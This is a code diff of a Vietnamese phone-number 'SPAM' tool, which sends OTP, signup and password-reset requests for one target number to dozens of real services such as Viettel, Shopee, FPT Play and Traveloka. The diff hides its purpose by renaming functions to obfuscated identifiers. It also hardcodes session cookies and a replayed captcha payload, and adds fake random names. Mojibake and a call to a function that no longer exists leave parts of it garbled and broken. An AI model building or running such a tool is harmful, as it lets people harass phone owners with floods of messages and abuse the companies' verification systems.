@@ -1,3 +1,9 @@
+
+import requests
+import json
+from colorama import Fore, Style
+from datetime import datetime, timedelta
+from pytz import timezone
 import requests
 import time
 import json
@@ -7,81 +13,77 @@ import string
 from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
 import threading
-from requests.adapters import HTTPAdapter
-from requests.packages.urllib3.util.retry import Retry
-from requests.adapters import HTTPAdapter
-from requests.packages.urllib3.util.retry import Retry
-from requests.exceptions import ConnectionError, Timeout, RequestException
-
 from threading import BoundedSemaphore
-MAX_THREADS = 200000009000
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-
-
-import traceback
-
-# Vô hiệu hóa cảnh báo bảo mật
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-
-import logging
 import requests
-
+import datetime
+import hashlib
+import sys
 import os
+import os, sys, time
+from colorama import init, Style
 
-# Hiển thị banner bằng mã màu ANSI
+pyver = ".".join(sys.version.split(" ")[0].split(".")[:-1])
+__pypath__ = os.getcwd()
+chars = " ➤ [«/»] >>>"
+
+init(autoreset=True)
+
+def rgb(r, g, b):
+    return f"\033[38;2;{r};{g};{b}m"
+
 os.system('cls' if os.name == 'nt' else 'clear')
 
-print('\033[1;32m SPAM')
-print('\033[0m')  # Reset màu
-print("Tắt tool bấm Ctr + C 2lần")
+ban = f"""
+   __________________   _    __________
+  / ____/_  __/ ____/  | |  / / ____/ /
+ / /     / / / __/     | | / / /   / /
+/ /___  / / / /___     | |/ / /___/ /___
+\____/ /_/ /_____/     |___/\____/_____/
 
+        CTE VCL TRÙM TOOL
 
-
-
-
-
-
-# Vô hiệu hóa logging của requests và urllib3
-logging.getLogger("requests").setLevel(logging.WARNING)
-logging.getLogger("urllib3").setLevel(logging.WARNING)
-
-# Nếu muốn tắt hoàn toàn log, sử dụng dòng sau
-logging.getLogger("requests").propagate = False
-logging.getLogger("urllib3").propagate = False
-
+"""
+length = len(ban)
+for i, ch in enumerate(ban):
+    # Pha màu từ xanh (0,128,255) sang trắng (255,255,255)
+    r = int(0 + (255 - 0) * i / length)
+    g = int(128 + (255 - 128) * i / length)
+    b = int(255)
+    sys.stdout.write(rgb(r, g, b) + ch + Style.RESET_ALL)
+    sys.stdout.flush()
+    time.sleep(0.003)
+    
+ 
+MAX_THREADS = 18
 semaphore = BoundedSemaphore(MAX_THREADS)
-# Danh sách các họ, tên đệm và tên phổ biến
-last_names = ['Nguyễn', 'Trần', 'Lê', 'Phạm', 'Vũ', 'Hoàng']
-middle_names = ['Văn', 'Thị', 'Quang', 'Hoàng', 'Anh', 'Thanh']
+last_names = ['Nguyễn', 'Trần', 'Lê', 'Phạm', 'Võ', 'Hoàng']
+middle_names = ['Vân', 'Thị»‹', 'Quang', 'Hoàng', 'Anh', 'Thanh']
 first_names = ['Nam', 'Tuấn', 'Hương', 'Linh', 'Long', 'Duy']
 
-# Tạo tên ngẫu nhiên
-def generate_random_name():
+def OooOOo0O0oooO00OO0o0O():
     last_name = random.choice(last_names)
-    middle_name = random.choice(middle_names) if random.choice([True, False]) else ''  # Optional middle name
+    middle_name = random.choice(middle_names) if random.choice([True, False]) else ''
     first_name = random.choice(first_names)
     return f"{last_name} {middle_name} {first_name}".strip()
 
 
-def generate_random_id():
-    def random_segment(length):
+def NNNNNMMNMMNNMNMMNNM():
+    def LJJLILIIILJJLLLLJILLIJ(length):
         return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))
     
     return f"{random_segment(2)}7D7{random_segment(1)}6{random_segment(1)}E-D52E-46EA-8861-ED{random_segment(1)}BB{random_segment(2)}86{random_segment(3)}"
 
-def generate_random_id():
+def xxwwxwxwwwwwwxxxxxwwwxw():
     return ''.join(random.choices(string.ascii_uppercase + string.digits, k=32))
 
-def format_device_id(device_id):
+def xxwwwwwxxwwwxxxwxxwwxwxxx(device_id):
     return f"{device_id[:8]}-{device_id[8:12]}-{device_id[12:16]}-{device_id[16:20]}-{device_id[20:]}"
 
-random_id = generate_random_id()
-formatted_device_id = format_device_id(random_id)
+random_id = xxwwxwxwwwwwwxxxxxwwwxw()
+formatted_device_id = xxwwwwwxxwwwxxxwxxwwxwxxx(random_id)
 
 
-#//////////////////////////
-
-def send_otp_via_sapo(sdt):
+def XWXWWWXWWWXXXXXXWW(sdt):
     cookies = {
         'landing_page': 'https://www.sapo.vn/',
         'start_time': '07/30/2024 16:21:32',
@@ -114,7 +116,7 @@ def send_otp_via_sapo(sdt):
     }
 
     response = requests.post('https://www.sapo.vn/fnb/sendotp', cookies=cookies, headers=headers, data=data)
-    print('thành Công') #("Sapo OTP response:", response.text)
+    print("Sapo OTP response:", response.text)
 
 #           _          _     _            _ 
 #          (_)        | |   | |          | |
@@ -124,7 +126,7 @@ def send_otp_via_sapo(sdt):
 #    \_/   |_|  \___|  \__|  \__|  \___| |_|
 #                                           
 #   https://viettel.vn                                        
-def send_otp_via_viettel(sdt):
+def lIlIlllllllIllIlI(sdt):
     cookies = {
         'laravel_session': 'ubn0cujNbmoBY3ojVB6jK1OrX0oxZIvvkqXuFnEf',
         'redirectLogin': 'https://viettel.vn/myviettel',
@@ -159,7 +161,7 @@ def send_otp_via_viettel(sdt):
     }
 
     response = requests.post('https://viettel.vn/api/getOTPLoginCommon', cookies=cookies, headers=headers, json=json_data)
-    print('thành Công') #("Viettel OTP response:", response.text)
+    print("Viettel OTP response:", response.text)
 
 
 
@@ -179,7 +181,7 @@ def send_otp_via_viettel(sdt):
 
 
 
-def send_otp_via_medicare(sdt):
+def S2S22SS22SSSSSSSSS2SS(sdt):
     cookies = {
         'SERVER': 'nginx2',
         '_gcl_au': '1.1.481698065.1722327865',
@@ -218,11 +220,11 @@ def send_otp_via_medicare(sdt):
     }
 
     response = requests.post('https://medicare.vn/api/otp', cookies=cookies, headers=headers, json=json_data)
-    print('thành Công') #("Viettel OTP medicare:", response.text)
+    print("Viettel OTP medicare:", response.text)
 
 
 
-def send_otp_via_tv360(sdt):
+def OODOOooDoOOoOoOooDD(sdt):
 
     cookies = {
         'img-ext': 'avif',
@@ -259,13 +261,13 @@ def send_otp_via_tv360(sdt):
     }
 
     response = requests.post('https://tv360.vn/public/v1/auth/get-otp-login', cookies=cookies, headers=headers, json=json_data)
-    print('thành Công') #("Viettel OTP TV360:", response.text)
+    print("Viettel OTP TV360:", response.text)
 
 
 
 # ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 
-def send_otp_via_dienmayxanh(sdt):
+def JIILIILJJILJJILJIILLJILI(sdt):
     cookies = {
         'TBMCookie_3209819802479625248': '657789001722328509llbPvmLFf7JtKIGdRJGS7vFlx2E=',
         '___utmvm': '###########',
@@ -307,14 +309,13 @@ def send_otp_via_dienmayxanh(sdt):
         cookies=cookies,
         headers=headers,
         data=data,
-        verify=False,
     )
 
-    print('thành Công') #("OTP SEND ĐIỆN MÁY XANH:", response.text)
+    print("OTP SEND SPAM THÀNH CÔNG:", response.text)
 
 
 
-def send_otp_via_kingfoodmart(sdt):
+def S222SSSSSS222S2SS2SS22222S(sdt):
     headers = {
         'accept': '*/*',
         'accept-language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
@@ -344,13 +345,13 @@ def send_otp_via_kingfoodmart(sdt):
         'query': 'mutation SendOtp($input: SendOtpInput!) {\n  sendOtp(input: $input) {\n    otpTrackingId\n    __typename\n  }\n}',
     }
 
-    response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data, timeout=100)
+    response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data)
 
 
     print("OTP SEND kingfoodmart:", response.text)
 
 
-def send_otp_via_mocha(sdt):
+def lIIllIlllIIllIIlIllI(sdt):
     headers = {
     'Accept': 'application/json, text/plain, */*',
     'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
@@ -377,9 +378,9 @@ def send_otp_via_mocha(sdt):
     response = requests.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', params=params, headers=headers)
 
 
-    print('thành Công') #("OTP SEND modcha:", response.json)
+    print("OTP SEND modcha:", response.json)
 
-def send_otp_via_fptdk(sdt):
+def DOOOOoDDDOODDDDoDooO(sdt):
     headers = {
         'accept': 'application/json, text/plain, */*',
         'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
@@ -405,13 +406,13 @@ def send_otp_via_fptdk(sdt):
     }
 
     response = requests.post(
-        'https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=HvBYCEmniTEnRLxYzaiHyg&e=1722340953&device=Microsoft%20Edge(version%253A127.0.0.0)&drm=1',
+        'https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=HvBYCEmniTEnRLxYzaiHyg&amp;e=1722340953&amp;device=Microsoft%20Edge(version%253A127.0.0.0)&amp;drm=1',
         headers=headers,
         json=json_data,
     )
-    print('thành Công') #("OTP SEND FPT Đăng ký: đã gửi ")
+    print("OTP SEND FPT SPAM THÀNH CÔNG ")
 
-def send_otp_via_fptmk(sdt): # là quên pass ở fps á
+def llIllIIIIlIlIIlIlIlll(sdt): # lÃ&nbsp; quÃªn pass á»Ÿ fps Ã¡
     cookies = {
         'auth.strategy': '',
         'expire_welcome': '14400',
@@ -469,14 +470,14 @@ def send_otp_via_fptmk(sdt): # là quên pass ở fps á
     }
 
     response = requests.post(
-        'https://api.fptplay.net/api/v7.1_w/user/otp/reset_password_otp?st=0X65mEX0NBfn2pAmdMIC1g&e=1722365955&device=Microsoft%20Edge(version%253A127.0.0.0)&drm=1',
+        'https://api.fptplay.net/api/v7.1_w/user/otp/reset_password_otp?st=0X65mEX0NBfn2pAmdMIC1g&amp;e=1722365955&amp;device=Microsoft%20Edge(version%253A127.0.0.0)&amp;drm=1',
         headers=headers,
         json=json_data,
     )
-    print('thành Công') #("OTP SEND FPT Quên pass: Đã gửi ")
+    print("OTP SEND FPT SPAM THÀNH CÔNG ")
 
 
-def send_otp_via_VIEON(sdt):
+def NMMNNNMMNMMMMNNNM(sdt):
     headers = {
         'accept': 'application/json, text/plain, */*',
         'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
@@ -485,7 +486,7 @@ def send_otp_via_VIEON(sdt):
         'dnt': '1',
         'origin': 'https://vieon.vn',
         'priority': 'u=1, i',
-        'referer': 'https://vieon.vn/auth/?destination=/&page=/',
+        'referer': 'https://vieon.vn/auth/?destination=/&amp;page=/',
         'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
         'sec-ch-ua-mobile': '?0',
         'sec-ch-ua-platform': '"Windows"',
@@ -512,9 +513,9 @@ def send_otp_via_VIEON(sdt):
     }
 
     response = requests.post('https://api.vieon.vn/backend/user/v2/register', params=params, headers=headers, json=json_data)
-    print('thành Công') #("OTP SEND VIEON:", response.text)
+    print("OTP SEND VIEON:", response.text)
 
-def send_otp_via_ghn(sdt):
+def XWWWWXWXWXXXXXXWXXW(sdt):
     headers = {
         'accept': 'application/json, text/plain, */*',
         'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
@@ -538,10 +539,10 @@ def send_otp_via_ghn(sdt):
     }
 
     response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data)
-    print('thành Công') #("OTP SEND GHN EXPRESS :", response.text)
+    print("OTP SEND GHN EXPRESS :", response.text)
 
 
-def send_otp_via_lottemart(sdt):
+def MNMNNNMNMNMNNNMMNNMN(sdt):
 
     headers = {
         'accept': 'application/json',
@@ -571,13 +572,13 @@ def send_otp_via_lottemart(sdt):
         headers=headers,
         json=json_data,
     )
-    print('thành Công') #("OTP SEND SPEED LOTTE:", response.text)
+    print("OTP SEND SPEED LOTTE:", response.text)
 
 
 
 
 
-def send_otp_via_DONGCRE(sdt):
+def OO00OoO0o0Oo0ooOOo0OOO0o(sdt):
 
     headers = {
         'accept': 'application/json',
@@ -603,14 +604,14 @@ def send_otp_via_DONGCRE(sdt):
     }
 
     response = requests.post('https://api.vayvnd.vn/v2/users/password-reset', headers=headers, json=json_data)
-    print('thành Công') #("OTP SEND DONGCRE:", response.text)
+    print("OTP SEND DONGCRE:", response.text)
 
 
 
 
 
 
-def send_otp_via_shopee(sdt):
+def Oo0oO0ooooo0O000O0ooO(sdt):
     cookies = {
         '_QPWSDCXHZQA': 'e7d49dd0-6ed7-4de5-a3d4-a5dddf426740',
         'REC7iLP4Q': '312bf815-7526-4121-82bf-61c29691b57f',
@@ -672,11 +673,11 @@ def send_otp_via_shopee(sdt):
     response = requests.post('https://shopee.vn/api/v4/otp/get_settings_v2', cookies=cookies, headers=headers, json=json_data)
 
 
-    print('thành Công') #("OTP SEND shopee:", response.text)
+    print("OTP SEND shopee:", response.text)
 
 
 
-def send_otp_via_TGDD(sdt):
+def LJIJIILJJJLIJLJJILJ(sdt):
     cookies = {
         'TBMCookie_3209819802479625248': '894382001722342691cqyfhOAE+C8MQhU15demYwBqEBg=',
         '___utmvm': '###########',
@@ -720,11 +721,11 @@ def send_otp_via_TGDD(sdt):
         data=data,
     )
 
-    print('thành Công') #("OTP SEND THẾ GIỚ DI ĐỘNG OKE :", response.text)
+    print("OTP SEND SPAM THÀNH CÔNG :", response.text)
 
 
 
-def send_otp_via_fptshop(sdt):
+def IlIIIlIlllIlIIlIlIllI(sdt):
     headers = {
         'accept': '*/*',
         'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
@@ -751,11 +752,11 @@ def send_otp_via_fptshop(sdt):
     }
 
     response = requests.post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', headers=headers, json=json_data)
-    print('thành Công') #("OTP SEND FPTSHOP:", response.text)
+    print("OTP SEND FPTSHOP:", response.text)
 
 
 
-def send_otp_via_WinMart(sdt):
+def IlIIlllIIlIIIIlIIllIll(sdt):
     headers = {
         'accept': 'application/json',
         'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
@@ -776,7 +777,7 @@ def send_otp_via_WinMart(sdt):
     }
 
     json_data = {
-        'firstName': 'Nguyễn Quang Ngọc',
+        'firstName': 'Nguyá»…n Quang Ngá»c',
         'phoneNumber': sdt,
         'masanReferralCode': '',
         'dobDate': '2024-07-26',
@@ -784,9 +785,9 @@ def send_otp_via_WinMart(sdt):
     }
 
     response = requests.post('https://api-crownx.winmart.vn/iam/api/v1/user/register', headers=headers, json=json_data)
-    print('thành Công') #("OTP SEND WinMart:", response.text)
+    print("OTP SEND WinMart:", response.text)
 
-def send_otp_via_vietloan(sdt):
+def ODoOODODDOOOOOODDoDDOO(sdt):
     cookies = {
         '__cfruid': '05dded470380675f852d37a751c7becbfec7f394-1722345991',
         'XSRF-TOKEN': 'eyJpdiI6IittWVVUb1dUNFNMRUtKRiswaDhITHc9PSIsInZhbHVlIjoiVTNWSU9vdTdJYndFZlM1UFo4enlQMzRCeENSWXRwNjgwT1NtWEdOSVNuNmNBZkxTMnUyRUJ1dytNSlVJVjZKS0o1V1FRQS81L2xFN0NOdGkvQitnL2xScjlGd3FBSXNBaUQ5ekdOTHBMMjY2b0tsZlI0OFZRdW9BWjgvd3V6blgiLCJtYWMiOiJhNzQwNzY5ZmY1YzZmNzMzYWFmOWM5YjVjYjFkYjA2MzJkYWIyNjVlOGViY2U2NGQxOGFiZWI4MGQ3NGI1Nzk1IiwidGFnIjoiIn0%3D',
@@ -832,10 +833,10 @@ def send_otp_via_vietloan(sdt):
 
     response = requests.post('https://vietloan.vn/register/phone-resend', cookies=cookies, headers=headers, data=data)
 
-    print('thành Công') #("OTP SEND vietloan:", response.text)
+    print("OTP SEND vietloan:", response.text)
 
 
-def send_otp_via_lozi(sdt):
+def XXWXWWWXXXXXXWXXXWXXX(sdt):
     headers = {
         'accept': '*/*',
         'accept-language': 'vi',
@@ -863,11 +864,11 @@ def send_otp_via_lozi(sdt):
 
     response = requests.post('https://mocha.lozi.vn/v1/invites/use-app', headers=headers, json=json_data)
 
-    print('thành Công') #("OTP SEND lozi:", response.text)
+    print("OTP SEND lozi:", response.text)
 
 
 
-def send_otp_via_F88(sdt):
+def OOoO0O0OO000Oo00OooO0O0o(sdt):
     headers = {
         'accept': 'application/json, text/plain, */*',
         'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
@@ -886,7 +887,7 @@ def send_otp_via_F88(sdt):
     }
 
     json_data = {
-        'FullName': generate_random_name(),
+        'FullName': OooOOo0O0oooO00OO0o0O(),
         'Phone': sdt,
         'DistrictCode': '024',
         'ProvinceCode': '02',
@@ -898,12 +899,12 @@ def send_otp_via_F88(sdt):
     }
 
     response = requests.post('https://api.f88.vn/growth/webf88vn/api/v1/Pawn', headers=headers, json=json_data)
-    print('thành Công') #("OTP SEND F88:", response.text)
+    print("OTP SEND F88:", response.text)
 
 
 
 
-def send_otp_via_spacet(sdt):
+def xwxwxxxxwwxxwwxwxwxxwxx(sdt):
     cookies = {
         '__Secure-3PAPISID': 'hzjo-onowVujm8hO/APR9oFpV5LpkJ1uUf',
         '__Secure-3PSID': 'g.a000mAj8VTgKdTM5295zCD8FHTg2FaugGzXq7QDPI6k2r47swLbbR0CWinLh60SIYySIqJMj2gACgYKAQsSAQASFQHGX2MiggjnC5RZxxFQPBEqGX6bjBoVAUF8yKqII052GBUsfWgiEjonB8li0076',
@@ -920,7 +921,7 @@ def send_otp_via_spacet(sdt):
         'dnt': '1',
         'origin': 'https://www.google.com',
         'priority': 'u=1, i',
-        'referer': 'https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LcHxRYpAAAAAIFLshnMlgJN9kcRhs3Df3xg2_jT&co=aHR0cHM6Ly9zcGFjZXQudm46NDQz&hl=vi&v=Xv-KF0LlBu_a0FJ9I5YSlX5m&size=invisible&cb=fo432ewf4lpx',
+        'referer': 'https://www.google.com/recaptcha/api2/anchor?ar=1&amp;k=6LcHxRYpAAAAAIFLshnMlgJN9kcRhs3Df3xg2_jT&amp;co=aHR0cHM6Ly9zcGFjZXQudm46NDQz&amp;hl=vi&amp;v=Xv-KF0LlBu_a0FJ9I5YSlX5m&amp;size=invisible&amp;cb=fo432ewf4lpx',
         'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
         'sec-ch-ua-mobile': '?0',
         'sec-ch-ua-platform': '"Windows"',
@@ -934,7 +935,7 @@ def send_otp_via_spacet(sdt):
         'k': '6LcHxRYpAAAAAIFLshnMlgJN9kcRhs3Df3xg2_jT',
     }
 
-    data = '\n(6LcHxRYpAAAAAIFLshnMlgJN9kcRhs3Df3xg2_jT\x12¤\f03AFcWeA5N20RmwugrYXllw1qNvjZjMw1YM6jNS1uLsQvHNfK7A7-mPD2jAUXtw00ffIH4keDhheR5uEx81NMRq49hMkqK4ks6D5bELOyxwUxFiGciBFSLlFS58zNR8CGGG9OX7rnBPoImKP1mpQXLlCtEym2HF0l84vS2zCwHZB03Mb3CMsDfY0ifAxmD56Wn6_y0wV9uOKCosGpaZsA1UfW8b6y5eWM848ISQFO5zZ8-uWrbA3I570xFnLpyweGdBxV5EhEvUmRFAew8ujF714EYjsfmwwsHFpfVf8jkhrkdU94cfJSCdZ2CCDMybnf3qYQmCOFJbgGD8EgmJoL_hBbkbzxEpPf2vsdl3OdqOrpiwSUz2_wPPxTnh7Ff3XQfA2oGy6971ah6aYNo2wq6H15rX32WOl9vsPMW0bzEShwDEG9UHoBVXNxVzwJEiMrTtVDbFT9zcHsrrx_9VWQfeKG3F6Ls6iUmk_af7kH41i-teLcl4_BiIyv9w_u2rLFSS7zIA-qWOm01tDb36oyyyDmKDJ-CPN4UW-dbwT8nHRDVG5MscfUy-PBByzgX60kMvbPVXiCUjsOcW-m-xAobKW37HtuFzkKQTwWSdLYBQwqtUXjMiUPj1UZEH5qkRCnSlnNxcgZRe4ZgG2jKwXnVLiQFpgkF9rfsPJVTv1aBRqz3JM3K__-ZgbpbUqRXZKlCenebNn4tPIANEDS9TaGM4umKtjPo20jnE7CbZ7Zk2IfR9MXb7uDFskqB-s15h4zX3875Y11fYqj81Ao4Es8GrSe15YuazIPc8VGvRIFqBUilksOqRBDTfK-3LM8fTtWpSUthBxVEqaLKa18ull1vabRBl24TsA82pUjb2WEjTG3nYdTn5iQST913rlHQMDJ-w_PvuKm1nj7pW0vUcoasNW2vjmciOUEdKqr4zVAlFxPHLWq7Rsz3qau4Xd2hCby56gM4T9sH1xxX6_yH56izqQfqgr7M8ekM-AviEXnGz_HXwZBwNkyHXwnEoYbRwn4yFszTm2GTgpJo8UJr8H4TvrEX7c2dny0NEtsI--yGBgGzms7gOjnx70aiaqdWidOfPOfKs95mU9HI_UG502624YTzh7YGL0d9knjdXAJ6di23Ftf9qtaKpOwIwHJFHHjONZ6IHu5vDpaaCxUwCHIqxFgKS7XNuXH8H0-swLtiRD2A0HP01lbCGubHS3qebLy9u77NmzIEUBPJ3m6NloU52JGxupdPSIOVsQM6W-cQU36YEwXR-Ecw9YaSRzfOBKSqP_WE0NEuZ5orXvnM9a310MUccYpqcVL1YIwRSS0t0Mn4XTMCyA7D21yca1uOooGVsqPddCr4GmOBzCCGsbYmgnVWKGlQFJ_EeJMtLA4HBvp-bUThZE3H0tJL6YGb5EU9zvpqSdTNeG8BmVgb2wCJDW3qDXO-0rbUCqYJY6sahGQ0sfm3dJN5zHOqAxhuMdfHvQqg5-q5WkNGMXUyMDALbXwW1IAqqdpHPmk7hGuu6d3pLfwNygJsirGHSxiGK0WBiyJUMtNPyRQAzX4JFd5zV5ff71tDpNjN4Q\x1a\x18Xv-KF0LlBu_a0FJ9I5YSlX5m"E\bð\x01\x18\x01*>\n\b\b\x01\x10Õ\x01\x18ù\x02\n\b\b\x02\x10¬\x8a\x02\x18:\n\x0e\b\x04\x10ç\x8a\x02\x18ù\x01*\x03\x10¸`\n\b\b\x02\x10¤\x93\x05\x18X\n\x0e\b\x04\x10ý\x93\x05\x18\x96\x01*\x03\x10»n'.encode()
+    data = '\n(6LcHxRYpAAAAAIFLshnMlgJN9kcRhs3Df3xg2_jT\x12Â¤\f03AFcWeA5N20RmwugrYXllw1qNvjZjMw1YM6jNS1uLsQvHNfK7A7-mPD2jAUXtw00ffIH4keDhheR5uEx81NMRq49hMkqK4ks6D5bELOyxwUxFiGciBFSLlFS58zNR8CGGG9OX7rnBPoImKP1mpQXLlCtEym2HF0l84vS2zCwHZB03Mb3CMsDfY0ifAxmD56Wn6_y0wV9uOKCosGpaZsA1UfW8b6y5eWM848ISQFO5zZ8-uWrbA3I570xFnLpyweGdBxV5EhEvUmRFAew8ujF714EYjsfmwwsHFpfVf8jkhrkdU94cfJSCdZ2CCDMybnf3qYQmCOFJbgGD8EgmJoL_hBbkbzxEpPf2vsdl3OdqOrpiwSUz2_wPPxTnh7Ff3XQfA2oGy6971ah6aYNo2wq6H15rX32WOl9vsPMW0bzEShwDEG9UHoBVXNxVzwJEiMrTtVDbFT9zcHsrrx_9VWQfeKG3F6Ls6iUmk_af7kH41i-teLcl4_BiIyv9w_u2rLFSS7zIA-qWOm01tDb36oyyyDmKDJ-CPN4UW-dbwT8nHRDVG5MscfUy-PBByzgX60kMvbPVXiCUjsOcW-m-xAobKW37HtuFzkKQTwWSdLYBQwqtUXjMiUPj1UZEH5qkRCnSlnNxcgZRe4ZgG2jKwXnVLiQFpgkF9rfsPJVTv1aBRqz3JM3K__-ZgbpbUqRXZKlCenebNn4tPIANEDS9TaGM4umKtjPo20jnE7CbZ7Zk2IfR9MXb7uDFskqB-s15h4zX3875Y11fYqj81Ao4Es8GrSe15YuazIPc8VGvRIFqBUilksOqRBDTfK-3LM8fTtWpSUthBxVEqaLKa18ull1vabRBl24TsA82pUjb2WEjTG3nYdTn5iQST913rlHQMDJ-w_PvuKm1nj7pW0vUcoasNW2vjmciOUEdKqr4zVAlFxPHLWq7Rsz3qau4Xd2hCby56gM4T9sH1xxX6_yH56izqQfqgr7M8ekM-AviEXnGz_HXwZBwNkyHXwnEoYbRwn4yFszTm2GTgpJo8UJr8H4TvrEX7c2dny0NEtsI--yGBgGzms7gOjnx70aiaqdWidOfPOfKs95mU9HI_UG502624YTzh7YGL0d9knjdXAJ6di23Ftf9qtaKpOwIwHJFHHjONZ6IHu5vDpaaCxUwCHIqxFgKS7XNuXH8H0-swLtiRD2A0HP01lbCGubHS3qebLy9u77NmzIEUBPJ3m6NloU52JGxupdPSIOVsQM6W-cQU36YEwXR-Ecw9YaSRzfOBKSqP_WE0NEuZ5orXvnM9a310MUccYpqcVL1YIwRSS0t0Mn4XTMCyA7D21yca1uOooGVsqPddCr4GmOBzCCGsbYmgnVWKGlQFJ_EeJMtLA4HBvp-bUThZE3H0tJL6YGb5EU9zvpqSdTNeG8BmVgb2wCJDW3qDXO-0rbUCqYJY6sahGQ0sfm3dJN5zHOqAxhuMdfHvQqg5-q5WkNGMXUyMDALbXwW1IAqqdpHPmk7hGuu6d3pLfwNygJsirGHSxiGK0WBiyJUMtNPyRQAzX4JFd5zV5ff71tDpNjN4Q\x1a\x18Xv-KF0LlBu_a0FJ9I5YSlX5m"E\bÃ°\x01\x18\x01*&gt;\n\b\b\x01\x10Ã•\x01\x18Ã¹\x02\n\b\b\x02\x10Â¬\x8a\x02\x18:\n\x0e\b\x04\x10Ã§\x8a\x02\x18Ã¹\x01*\x03\x10Â¸`\n\b\b\x02\x10Â¤\x93\x05\x18X\n\x0e\b\x04\x10Ã½\x93\x05\x18\x96\x01*\x03\x10Â»n'.encode()
 
     response = requests.post('https://www.google.com/recaptcha/api2/clr', params=params, cookies=cookies, headers=headers, data=data)
 
@@ -964,9 +965,9 @@ def send_otp_via_spacet(sdt):
     }
 
     response = requests.post('https://api.spacet.vn/www/user/phone', headers=headers, json=json_data)
-    print('thành Công') #("OTP SEND spacet:", response.text)
+    print("OTP SEND spacet:", response.text)
 
-def send_otp_via_vinpearl(sdt):
+def JLJLLIJJLJLJIIIIJLLLJJJJL(sdt):
 
 
     cookies = {
@@ -1026,11 +1027,11 @@ def send_otp_via_vinpearl(sdt):
         json=json_data,
     )
 
-    print('thành Công') #("OTP SEND vinpearl:", response.text)
+    print("OTP SEND vinpearl:", response.text)
 
 
-def send_otp_via_traveloka(sdt):
-    # Kiểm tra và chuyển đổi số điện thoại
+def oOOoDDDDoOoDoOoooO(sdt):
+    # Kiá»ƒm tra vÃ&nbsp; chuyá»ƒn Ä‘á»•i sá»‘ Ä‘iá»‡n thoáº¡i
     if sdt.startswith('09'):
         sdt = '+84' + sdt[1:]
 
@@ -1041,7 +1042,7 @@ def send_otp_via_traveloka(sdt):
         'aws-waf-token': '98d9a3ce-74ae-4c55-9bc7-7f7bfd38eb33:AAoAv+Nn46QoAAAA:gvxS6OK/WD3sgvZHozCEooVHTXFGAse4BHwX3duvO+1ES7UfgyxW6JHZw/k60EUGp/zHOcObgnYj0450R3SsunEzxE12r6B4nqNXb12qrlWT68DMtNKLE+LXTcI/ssNVkL0bTzMBfZy87typHsUqku8II9EBQ9+yrb4IwvRLQJ+dmRBmjBXZEV/Jnj6ME53ngtZW+cIk0vb0tOi38a7mSK9uZw==',
         'tvl': 'Pp2fiNmPN9ehu7LHMwNpGSSbQ0zEW8yNJGNrzEA+b5Tu/0QLSpEb9I15NcVASi6xJr7DpGrOW4FLV8SlNNIS5eciWJ9DfTh0Rbclt/MUEHKt6Liu/yDwgdnfnNkZKsVz21+N16DTS1sA51j3T1hUeUkdZnQ4Fql7MYzqG7/ae3YyBZr5Ks3dvYv7j7osaueb96QnQa/Hzd7of7MTXYnzZbl0A9Yi9G3pWvWsmPXbQonHXb1qNRSCi5KVUWjjYHkcHvCLnDOGI3o=~djAy',
         'tvs': 'kOOPm9nR1+er1b8TFCAUgDLEIZ3VFBFIPFWJkFnDJ4stbii+OyDY47kN6Azp58gWhUyymih08uHGt5lhT4PvuwxDSvjXKwvZ/02k2VjAe65GOakasngrQF4EGjnnw3DDuoETUig5QjfQDfgEftAjG85pM6p6TvSU31SizW/I9caAmXpcw3LUVuyTt78y12sZZpeW+OUayg==~djAy',
-        '_dd_s': 'rum=0&expire=1722352252222&logs=1&id=a1a90fe7-fce8-48b0-9100-5f789ab941af&created=1722351314461',
+        '_dd_s': 'rum=0&amp;expire=1722352252222&amp;logs=1&amp;id=a1a90fe7-fce8-48b0-9100-5f789ab941af&amp;created=1722351314461',
     }
 
     headers = {
@@ -1073,11 +1074,11 @@ def send_otp_via_traveloka(sdt):
     }
 
     response = requests.post('https://www.traveloka.com/api/v2/user/signup', cookies=cookies, headers=headers, json=json_data)
-    print('thành Công') #("OTP SEND traveloka:", response.text)
+    print("OTP SEND traveloka:", response.text)
 
 
 
-def send_otp_via_dongplus(sdt):
+def lIlIIIIIIIIlIlIIlllI(sdt):
 
 
     headers = {
@@ -1104,10 +1105,10 @@ def send_otp_via_dongplus(sdt):
     }
 
     response = requests.post('https://api.dongplus.vn/api/v2/user/check-phone', headers=headers, json=json_data)
-    print('thành Công') #("OTP SEND dongplus:", response.text)
+    print("OTP SEND dongplus:", response.text)
 
 
-def send_otp_via_longchau(sdt):
+def XWWWWXWXXWXXXXXXWXW(sdt):
 
 
     headers = {
@@ -1141,11 +1142,11 @@ def send_otp_via_longchau(sdt):
         headers=headers,
         json=json_data,
     )
-    print('thành Công') #("OTP SEND :", response.text)
+    print("OTP SEND :", response.text)
 
 
 
-def send_otp_via_longchau1(sdt):
+def O00oOoOo0O0Oo0OO00OO0(sdt):
 
     headers = {
         'accept': 'application/json, text/plain, */*',
@@ -1178,10 +1179,10 @@ def send_otp_via_longchau1(sdt):
         headers=headers,
         json=json_data,
     )
-    print('thành Công') #("OTP SEND :", response.text)
